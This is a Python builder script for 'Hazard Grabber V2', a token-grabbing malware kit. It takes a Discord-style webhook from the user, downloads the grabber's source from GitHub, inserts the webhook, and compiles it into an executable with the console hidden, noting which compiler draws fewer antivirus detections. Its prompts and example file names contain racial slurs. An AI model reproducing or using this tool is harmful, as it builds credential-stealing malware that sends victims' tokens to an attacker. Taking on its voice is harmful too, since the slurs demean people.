#made by K.Dot#0001 cause cool.
import os
import time

try:
    os.system('python --version')
except:
    print('Please install python and add it to path!')
    time.sleep(4)
    os._exit

try:
    from slowprint.slowprint import *
except:
    os.system("pip install slowprint")
    from slowprint.slowprint import *

try:
    import requests
except:
    os.system("pip install requests")
    import requests

try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil

try:
    from pystyle import Colors, Colorate, Center
except:
    os.system("pip install pystyle")
    from pystyle import Colors, Colorate, Center

try:
    import httpx
except:
    os.system("pip install httpx")
    import httpx

try:
    import pyotp
except:
    os.system("pip install pyotp")
    import pyotp

try:
    import psutil
except:
    os.system("pip install psutil")
    import psutil

os.system("pip install pypiwin32")
os.system("pip install pycryptodome")
os.system("pip install pyinstaller")
os.system("pip install PIL-tools")

os.system('cls')




banner1 = (Center.XCenter('''

 ██░ ██  ▄▄▄      ▒███████▒ ▄▄▄       ██▀███  ▓█████▄      ▄████  ██▀███   ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
▓██░ ██▒▒████▄    ▒ ▒ ▒ ▄▀░▒████▄    ▓██ ▒ ██▒▒██▀ ██▌    ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌   ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
░▓█ ░██ ░██▄▄▄▄██   ▄▀▒   ░░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌   ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓ ▓█   ▓██▒▒███████▒ ▓█   ▓██▒░██▓ ▒██▒░▒████▓    ░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░░▒▒ ▓░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒     ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░  ▒   ▒▒ ░░░▒ ▒ ░ ▒  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒      ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░  ░   ▒   ░ ░ ░ ░ ░  ░   ▒     ░░   ░  ░ ░  ░    ░ ░   ░   ░░   ░   ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
 ░  ░  ░      ░  ░  ░ ░          ░  ░   ░        ░             ░    ░           ░  ░ ░       ░         ░  ░   ░     
                  ░                            ░                                          ░       ░                 
'''))
#dont judge this
print(Colorate.Color(Colors.red, banner1, True))

slowprint(Colors.green + 'Welcome to Hazard Grabber V2!\n', .5)

worms = input(str('Enter Webhook Here -> '))

print(" ") #idk how to print a new line after an input lmao

slowprint(f'Your Webhook is {worms}\n', 0.1)

nah = input('Would you like to make an exe? y/n -> ')

print(' ')

if nah == 'y':
    freeze = input('''
pyinstaller (cool) [1]
cx_freeze (waaay less detections but isn't onefile and also doesn't hide console) [2]
nuitka (takes long time to compile) [3]
    
Please pick a number! -> ''')

    print(' ')

    if freeze == '1':
        damn = input('What would you like the exe name to be? (example = fucknigga) -> ')
        code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", worms)
        with open(f"{damn}.py", 'w', encoding='utf-8', errors="ignore") as f:
            f.write(code)
        os.system(f'pyinstaller --clean --onefile --noconsole -i NONE -n {damn} {damn}.py')
        shutil.rmtree('build')
        os.remove(f'{damn}.spec')
        os.remove(f'{damn}.py')
        print(' ')
        slowprint('Your Exe has been generated!', .05)

    elif freeze == '2':
        damn = input('What would you like the exe name to be? (example = fucknigga) -> ')
        code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", worms)
        with open(f"{damn}.py", 'w', encoding='utf-8', errors="ignore") as f:
            f.write(code)
        os.system(f'cxfreeze -c {damn}.py')
        os.remove(f'{damn}.py')
        print(' ')
        slowprint('Your Exe has been generated!', .05)

    elif freeze == '3':
        damn = input('What would you like the exe name to be? (example = fucknigga) -> ')
        code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", worms)
        with open(f"{damn}.py", 'w', encoding='utf-8', errors="ignore") as f:
            f.write(code)
        os.system(f'nuitka --onefile --windows-disable-console {damn}.py')
    
    else:
        slowprint("That isn't an option nigga\n", .5)

elif nah == 'n':
    damn = input('What would you like the exe name to be? (example = fucknigga) -> ')
    code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", worms)
    with open(f"{damn}.py", 'w', encoding='utf-8', errors="ignore") as f:
        f.write(code)

else:
    print('that aint a command nigga')
    time.sleep(5)
    os._exit


print(' ')
stop = input('Press enter to exit')
